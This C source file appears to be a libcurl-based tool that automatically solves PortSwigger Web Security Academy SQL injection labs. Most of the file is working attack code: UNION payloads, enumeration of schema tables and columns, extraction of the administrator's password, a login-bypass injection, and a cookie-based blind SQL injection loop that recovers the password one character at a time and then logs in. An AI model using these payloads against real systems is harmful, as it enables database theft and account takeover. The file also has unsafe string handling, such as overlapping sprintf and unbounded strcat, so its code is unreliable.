#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>


size_t write_callback(void *data, size_t size, size_t count, void *output_buffer) {
    size_t total_size = size * count;
    strcat(output_buffer, data);
    return total_size;
}


static size_t HeaderCallback(void *data, size_t size, size_t count, void *output_header) {
    size_t total_size = size * count;
    strcat(output_header, data);
    return total_size;
}


int extract_csrf_token(const char *html_content, char *csrf_token, size_t token_size) {
    const char *token_start = strstr(html_content, "value=");
    if (token_start) {
        token_start += 7;
        const char *token_end = strchr(token_start, '"');
        if (token_end && (token_end - token_start) < token_size) {
            strncpy(csrf_token, token_start, token_end - token_start);
            csrf_token[token_end - token_start] = '\0';
            return 0;
        } 
    }
    return -1;
}


int extract_value(const char* html_content, const char* filter_value_start, const char* filter_value_end, char* value, int token_start_plus) {
    const char *token_start = strstr(html_content, filter_value_start);
    if (token_start) {
        token_start += token_start_plus;
        const char *token_end = strstr(token_start, filter_value_end);
        if (token_end) {
            strncpy(value, token_start, token_end - token_start);
            value[token_end - token_start] = '\0';
            return 1;
        }
    }
    return -1;
}


int parse_url(char *url) {
    if (strncmp(url, "http://", 7) == 0 || strncmp(url, "https://", 8) == 0) {
        int slashCount = 0;

        for (int i = 0; url[i] != '\0'; i++) {
            if (url[i] == '/') {
                slashCount++;
                if (slashCount == 3) {
                    url[i] = '\0';
                    break;
                }
            }
        }

        int length = strlen(url);
        if (length > 0 && url[length - 1] == '\n') {
            url[length - 1] = '\0';
        }

        return 1;
    }
    return 0;
}


void show_paas_ascii_art() {
    system("clear");
    printf("\033[38;5;208m  _____  \033[0m                 \033[38;5;208m _____ \n");
    printf("\033[38;5;208m |  __ \\ \033[0m /\\       /\\    \033[38;5;208m/ ____|  \n");
    printf("\033[38;5;208m | |__) | \033[0m/\\\\      /\\\\  \033[38;5;208m | (___    \n");
    printf("\033[38;5;208m |  ___/\033[0m /  \\\\    /  \\\\ \033[38;5;208m \\\\___ \\\\ \n");
    printf("\033[38;5;208m | | \033[0m   /====\\\\  /====\\\\  \033[38;5;208m____)  \n");
    printf("\033[38;5;208m |_| \033[0m  /      \\\\/      \\\\ \033[38;5;208m|_____/ \n");
    printf("\n[P]\033[0mortswigger \033[38;5;208m[A]\033[0mcademy \033[38;5;208m[A]\033[0mutomatic \033[38;5;208m[S]\033[0molver \n");
    printf("by \033[38;5;208mmr246\033[0m \n\n");
}


int extract_lab_id(const char *html_content) {
    const char *name_start = strstr(html_content, "<title>");
    if (name_start) {
        name_start += 7;
        const char *name_end = strchr(name_start, '<');
        if (name_end) {
            int lab_id = -1;
            char lab_name[150];
            strncpy(lab_name, name_start, name_end - name_start);
            lab_name[name_end - name_start] = '\0';

            if (strcmp(lab_name, "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data") == 0) {
                lab_id = 1;
            }
            else if (strcmp(lab_name, "SQL injection vulnerability allowing login bypass") == 0) {
                lab_id = 2;
            }
            else if (strcmp(lab_name, "SQL injection attack, querying the database type and version on Oracle") == 0) {
                lab_id = 3;
            }
            else if (strcmp(lab_name, "SQL injection attack, querying the database type and version on MySQL and Microsoft") == 0) {
                lab_id = 4;
            }
            else if (strcmp(lab_name, "SQL injection attack, listing the database contents on non-Oracle databases") == 0) {
                lab_id = 5;
            }
            else if (strcmp(lab_name, "SQL injection attack, listing the database contents on Oracle") == 0) {
                lab_id = 6;
            }
            else if (strcmp(lab_name, "SQL injection UNION attack, determining the number of columns returned by the query") == 0) {
                lab_id = 7;
            }
            else if (strcmp(lab_name, "SQL injection UNION attack, finding a column containing text") == 0) {
                lab_id = 8;
            }
            else if (strcmp(lab_name, "SQL injection UNION attack, retrieving data from other tables") == 0) {
                lab_id = 9;
            }
            else if (strcmp(lab_name, "SQL injection UNION attack, retrieving multiple values in a single column") == 0) {
                lab_id = 10;
            }
            else if (strcmp(lab_name, "Blind SQL injection with conditional responses") == 0) {
                lab_id = 11;
            }

            return lab_id;
        }
    }
    return -1;
}


int detect_column_count(char *url, char *response_buffer, CURLcode res, CURL *curl, char* comment_sign) {
    int i = 1;
    int max_attempts = 15;
    while (i < max_attempts) {
        if (strstr(response_buffer, "Internal Server Error") != NULL) {
            i -= 2;
            break;
        }
        sprintf(url, "%s/filter?category=Accessories'+order+by+%d%s", url, i, comment_sign);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        memset(response_buffer, 0, strlen(response_buffer));

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            printf(stderr, "error in detect_column_count() function!");
            return 0;
        }
        i++;
        parse_url(url);
    }
    return i;
}


int vulnerabilities(char *url) {
    CURL *curl;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_DEFAULT);
    char *response_buffer = (char*)calloc(500000, 1);
    char *csrf_token = (char*)calloc(64, sizeof(char));
    int return_value = -1;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_PROXY, "http://127.0.0.1:8080");
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response_buffer);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            goto quit;
        }

        int selected_lab;
        selected_lab = extract_lab_id(response_buffer);

        if (selected_lab == 1) {
            strcat(url, "/filter?category=Accessories'+or+1+=1--");
            curl_easy_setopt(curl, CURLOPT_URL, url);

            memset(response_buffer, 0, strlen(response_buffer));
            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
            goto quit;
        }

        else if (selected_lab == 2) {
            strcat(url, "/login");
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");

            memset(response_buffer, 0, strlen(response_buffer));
            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }

            extract_csrf_token(response_buffer, csrf_token, 64);

            char post_data[512];
            snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator'--&password=password", csrf_token);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

            memset(response_buffer, 0, strlen(response_buffer));
            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }

            parse_url(url);
            curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
            goto quit;
        }

        else if (selected_lab == 3) {
            // step one - determine the number of columns
            int i = detect_column_count(url, response_buffer, res, curl, "--");
            if (i == 0)
                goto quit;

            // step two - determine the database type
            char sqli_payload[] = "/filter?category=Accessories'+UNION+SELECT+'abc'";
            char sqli_payload_repeat[] = ",'test'";
            char sqli_payload_end[] = "+FROM+dual--";

            int f = 1;
            while(f != i) {
                strcat(sqli_payload, sqli_payload_repeat);
                f++;
            }

            strcat(sqli_payload, sqli_payload_end);
            strcat(url, sqli_payload);

            curl_easy_setopt(curl, CURLOPT_URL, url);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
            parse_url(url);

            // step three - exploit
            char sqli_payload_2[] = "/filter?category=Accessories'+UNION+SELECT+BANNER";
            char sqli_payload_repeat_2[] = ",+NULL";
            char sqli_payload_end_2[] = "+FROM+v$version--";

            while(f > 1) {
                strcat(sqli_payload_2, sqli_payload_repeat_2);
                f--;
            }

            strcat(sqli_payload_2, sqli_payload_end_2);
            strcat(url, sqli_payload_2);

            curl_easy_setopt(curl, CURLOPT_URL, url);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
            goto quit;
        }
        else if (selected_lab == 4) {
            int i = detect_column_count(url, response_buffer, res, curl, "%23");
            if (i == 0)
                goto quit;

            // step two - determine the database type
            char sqli_payload[] = "/filter?category=Accessories'+UNION+SELECT+'abc'";
            char sqli_payload_repeat[] = ",'test'";
            char sqli_payload_end[] = "%23";
            int f = 1;
            while (f < i) {
                strcat(sqli_payload, sqli_payload_repeat);
                f++;
            }

            strcat(sqli_payload, sqli_payload_end);
            strcat(url, sqli_payload);

            curl_easy_setopt(curl, CURLOPT_URL, url);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
            parse_url(url);

            // step three - exploit
            char sqli_payload_2[] = "/filter?category=Accessories'+UNION+SELECT+@@version";
            char sqli_payload_repeat_2[] = ",+NULL";
            char sqli_payload_end_2[] = "%23";

            f = 1;
            while (f < i) {
                strcat(sqli_payload_2, sqli_payload_repeat_2);
                f++;
            }

            strcat(sqli_payload_2, sqli_payload_end_2);
            strcat(url, sqli_payload_2);

            curl_easy_setopt(curl, CURLOPT_URL, url);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
            goto quit;
        }

        else if (selected_lab == 5) {
            // step one - determine the number of columns
            int i = detect_column_count(url, response_buffer, res, curl, "--");
            if (i == 0)
                goto quit;

            // step two - retrieve the list of tables in the database
            char sqli_payload[] = "/filter?category=Accessories'+UNION+SELECT+table_name";
            char sqli_payload_repeat[] = ",+NULL";
            char sqli_payload_end[] = "+FROM+information_schema.tables--";
            int f = 1;
            while (f < i) {
                strcat(sqli_payload, sqli_payload_repeat);
                f++;
            }

            strcat(sqli_payload, sqli_payload_end);
            strcat(url, sqli_payload);

            curl_easy_setopt(curl, CURLOPT_URL, url);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
            parse_url(url);

            // step three - finding the name of the table containing user credentials
            char users[25];
            extract_value(response_buffer, "users_", "<", users, 0);

            // step four  - retrieve the details of the columns in the user table
            char sqli_payload2[] = "/filter?category=Accessories'+UNION+SELECT+column_name";
            char sqli_payload_repeat2[] = ",+NULL";
            char sqli_payload_end2[150] = "";
            sprintf(sqli_payload_end2, "+FROM+information_schema.columns+WHERE+table_name='%s'--", users);

            int f2 = 1;
            while (f2 < i) {
                strcat(sqli_payload2, sqli_payload_repeat2);
                f2++;
            }
            strcat(sqli_payload2, sqli_payload_end2);
            strcat(url, sqli_payload2);

            curl_easy_setopt(curl, CURLOPT_URL, url);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
            parse_url(url);

            // step five  - finding the names of the columns containing usernames and passwords
            char users_column_name[25];
            extract_value(response_buffer, "username_", "<", users_column_name, 0);

            char users_column_password[25];
            extract_value(response_buffer, "password_", "<", users_column_password, 0);

            // step six  - retrieve the details of the columns in the users table
            char sqli_payload3[100];

            sprintf(sqli_payload3, "/filter?category=Accessories'+UNION+SELECT+%s,+%s", users_column_name, users_column_password);
            char sqli_payload_repeat3[] = ",+NULL";
            char sqli_payload_end3[40];
            sprintf(sqli_payload_end3, "+FROM+%s--", users);
            int f3 = 2;
            while (f3 < i) {
                strcat(sqli_payload3, sqli_payload_repeat3);
                f3++;
            }
            strcat(sqli_payload3, sqli_payload_end3);
            strcat(url, sqli_payload3);

            curl_easy_setopt(curl, CURLOPT_URL, url);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
            parse_url(url);

            // step seven - extract administrator's password from column
            char admin_account_password[30];
            extract_value(response_buffer, "administrator", "<", admin_account_password, 51);

            // step eight  - login as administrator and solve the lab
            parse_url(url);
            strcat(url, "/login");
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }

            extract_csrf_token(response_buffer, csrf_token, 64);

            char post_data[512];
            snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, admin_account_password);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
        }

        else if (selected_lab == 6) {
            // step one - determine the number of columns
            int i = detect_column_count(url, response_buffer, res, curl, "--");
            if (i == 0)
                goto quit;

            // step two - retrieve the list of tables in the database
            char sqli_payload[] = "/filter?category=Accessories'+UNION+SELECT+table_name";
            char sqli_payload_repeat[] = ",NULL";
            char sqli_payload_end[] = "+FROM+all_tables--";
            int f = 1;
            while (f < i) {
                strcat(sqli_payload, sqli_payload_repeat);
                f++;
            }

            strcat(sqli_payload, sqli_payload_end);
            strcat(url, sqli_payload);

            curl_easy_setopt(curl, CURLOPT_URL, url);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
            parse_url(url);

            // step three  - finding the names of the columns containing usernames and passwords
            char users_table_name[25];
            extract_value(response_buffer, ">USERS_", "<", users_table_name, 1);

            // step four  - retrieve the details of the columns in the user table
            char sqli_payload2[] = "/filter?category=Accessories'+UNION+SELECT+column_name";
            char sqli_payload_repeat2[] = ",NULL";
            char sqli_payload_end2[150];
            sprintf(sqli_payload_end2, "+FROM+all_tab_columns+WHERE+table_name='%s'--", users_table_name);

            int f2 = 1;
            while (f2 < i) {
                strcat(sqli_payload2, sqli_payload_repeat2);
                f2++;
            }
            strcat(sqli_payload2, sqli_payload_end2);
            strcat(url, sqli_payload2);

            curl_easy_setopt(curl, CURLOPT_URL, url);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
            parse_url(url);

            // step five  - finding the names of the columns containing usernames and passwords
            char users_column_name[25];
            extract_value(response_buffer, "USERNAME_", "<", users_column_name, 0);

            char users_column_password[25];
            extract_value(response_buffer, "PASSWORD_", "<", users_column_password, 0);

            // step six  - retrieve the details of the columns in the users table
            char sqli_payload3[100];
            sprintf(sqli_payload3, "/filter?category=Accessories'+UNION+SELECT+%s,+%s", users_column_name, users_column_password);
            char sqli_payload_repeat3[] = ",+NULL";
            char sqli_payload_end3[40];
            sprintf(sqli_payload_end3, "+FROM+%s--", users_table_name);
            int f3 = 2;
            while (f3 < i) {
                strcat(sqli_payload3, sqli_payload_repeat3);
                f3++;
            }
            strcat(sqli_payload3, sqli_payload_end3);
            strcat(url, sqli_payload3);

            curl_easy_setopt(curl, CURLOPT_URL, url);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
            parse_url(url);

            // step seven - extract administrator's password from column
            char admin_account_password[30];
            extract_value(response_buffer, "administrator", "<", admin_account_password, 51);

            // step eight  - login as administrator and solve the lab
            parse_url(url);
            strcat(url, "/login");
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }

            extract_csrf_token(response_buffer, csrf_token, 64);

            char post_data[512];
            snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, admin_account_password);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
        }

        else if (selected_lab == 7) {
            char sqli_payload[300] = "'+UNION+SELECT+NULL";
            char sqli_payload2[] = "";
            char sqli_payload3[] = "--";
            int i = 1;
            while (i) {

                sprintf(sqli_payload2, "%s,NULL", sqli_payload2);
                sprintf(sqli_payload, "%s%s%s", sqli_payload, sqli_payload2, sqli_payload3);
                sprintf(url, "%s/filter?category=Accessories%s", url, sqli_payload);
                curl_easy_setopt(curl, CURLOPT_URL, url);
                memset(response_buffer, 0, strlen(response_buffer));

                res = curl_easy_perform(curl);
                if (res != CURLE_OK) {
                    fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                    goto quit;
                }

                if (strstr(response_buffer, "Internal Server Error") == NULL) {
                    break;
                }

                i++;
                parse_url(url);
                sprintf(sqli_payload, "'+UNION+SELECT+NULL");
            }
        }

        else if (selected_lab == 8) {
            // step one - determine the number of columns
            int i = detect_column_count(url, response_buffer, res, curl, "--");
            if (i == 0)
                goto quit;

            // step two - extracting the text to be displayed
            char db_string[30];
            extract_value(response_buffer, "ing: '", "\'", db_string, 6);

            // step three  - trying replacing each null with the random value
            char sqli_payload[300] = "/filter?category=Accessories'+UNION+SELECT+NULL";
            char sqli_payload_repeat[] = ",NULL";
            char sqli_payload_end[] = "--";
            char sqli_payload_repeat2[30];
            sprintf(sqli_payload_repeat2, ",'%s'", db_string);

            int column = 1;

            int until_column_count = 1;
            while(until_column_count < i) {
                int f2 = 1;
                while (f2 < i) {
                    if (f2 == column) {
                        sprintf(sqli_payload, "%s%s", sqli_payload, sqli_payload_repeat2);
                    } else {
                        sprintf(sqli_payload, "%s%s", sqli_payload, sqli_payload_repeat);
                    }
                    f2++;
                }
                strcat(sqli_payload, sqli_payload_end);
                strcat(url, sqli_payload);
                curl_easy_setopt(curl, CURLOPT_URL, url);
                memset(response_buffer, 0, strlen(response_buffer));


                res = curl_easy_perform(curl);
                if (res != CURLE_OK) {
                    fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                    goto quit;
                }
                parse_url(url);
                sprintf(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+NULL");
                until_column_count++;
                column++;
            }
        }

        else if (selected_lab == 9) {
            sprintf(url, "%s/filter?category=Accessories'+UNION+SELECT+'abc','def'--", url);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }

            parse_url(url);
            sprintf(url, "%s/filter?category=Accessories'+UNION+SELECT+username,+password+FROM+users--", url);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }

            // extract administrator's password from column
            char admin_account_password[30];
            extract_value(response_buffer, "administrator", "<", admin_account_password, 51);

            // login as administrator and solve the lab
            parse_url(url);
            strcat(url, "/login");
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }

            extract_csrf_token(response_buffer, csrf_token, 64);

            char post_data[512];
            snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, admin_account_password);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
        }

        else if (selected_lab == 10) {
            sprintf(url, "%s/filter?category=Accessories'+UNION+SELECT+NULL,'abc'--", url);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }

            parse_url(url);
            sprintf(url, "%s/filter?category=Accessories'+UNION+SELECT+NULL,username||'~'||password+FROM+users--", url);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }

            // extract administrator's password from column
            char admin_account_password[30];
            extract_value(response_buffer, "administrator", "<", admin_account_password, 14);

            // login as administrator and solve the lab
            parse_url(url);
            strcat(url, "/login");
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }

            extract_csrf_token(response_buffer, csrf_token, 64);
            char post_data[512];
            snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, admin_account_password);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                goto quit;
            }
        }

        else if (selected_lab == 11) {
            char *header = (char*)calloc(50000, 1);
            char tracking_id_cookie[100];
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
            curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "");
            curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, HeaderCallback);
            curl_easy_setopt(curl, CURLOPT_HEADERDATA, header);
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                free(header);
                goto quit;
            }

            extract_value(header, "TrackingId=", ";", tracking_id_cookie, 11);

            show_paas_ascii_art();
            curl_easy_reset(curl);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_PROXY, "http://127.0.0.1:8080");
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, response_buffer);

            char password[50];
            memset(password, 0, sizeof(password));
            char sqli_payload[100];
            int l = 1;

            while(l < 21) {
                char character = 'a';
                int number = 0;
                int i = 0;
                while (i < 36) {
                    if (character + i > 'z') {
                        sprintf(sqli_payload, "TrackingId=%s' AND (SELECT SUBSTRING(password,%d,1) FROM users WHERE username='administrator')='%d",tracking_id_cookie, l, number);
                        number++;
                    }
                    else {
                    sprintf(sqli_payload, "TrackingId=%s' AND (SELECT SUBSTRING(password,%d,1) FROM users WHERE username='administrator')='%c",tracking_id_cookie, l, character+i);
                    }
                    curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
                    memset(response_buffer, 0, strlen(response_buffer));

                    res = curl_easy_perform(curl);
                    if (res != CURLE_OK) {
                        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                        free(header);
                        goto quit;
                    }
                    if (strstr(response_buffer, "Welcome back!") != NULL) {
                        if (character + i > 'z') {
                            sprintf(password, "%s%d", password, number-1);
                            break;
                        }
                        else {
                            sprintf(password, "%s%c", password, character+i);
                            break;
                        }
                    }
                    i++;
                }
                l++;
            }

            // login as administrator and solve the lab
            parse_url(url);
            strcat(url, "/login");
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                free(header);
                goto quit;
            }

            extract_csrf_token(response_buffer, csrf_token, 64);

            char post_data[512];
            snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, password);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
            memset(response_buffer, 0, strlen(response_buffer));

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                free(header);
                goto quit;
            }
            free(header);
        }
        else {
            printf("[!] Invalid input! (error code: 7)\n");
            goto quit;
        }

    } else {
        printf("[!] curl initialization failed!\n");
        goto quit;
    }

    quit:
        memset(response_buffer, 0, strlen(response_buffer));
        parse_url(url);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        memset(response_buffer, 0, strlen(response_buffer));

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            goto quit;
        }

        memset(response_buffer, 0, strlen(response_buffer));
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            goto quit;
        }

        if (strstr(response_buffer, "Congratulations, you solved the lab!") != NULL) {
            return_value = 0;
        }

        free(url);
        free(response_buffer);
        if (csrf_token)
            free(csrf_token);
        curl_easy_cleanup(curl);
        curl_global_cleanup();

        return return_value;
}   


int main() {
    char *input_url = (char *)malloc(200);

    show_paas_ascii_art();
    
    printf("\033[38;5;208mLab URL\033[0m: ");
    if (fgets(input_url, 200, stdin) != NULL) {
        if (parse_url(input_url) == 1) {
            if (vulnerabilities(input_url) == 0) {
                printf("[+] Lab successfully solved!\n");
                exit(0);
            } else {
                printf("[-] Something went wrong :(\n");
                exit(1);
            }

        } else {
            printf("[!] Invalid URL! (error in parse_url func)\n");
            exit(1);
          }
    } else {
        printf("[!] Invalid URL! (error in fgets func)\n");
        exit(1);
    }
}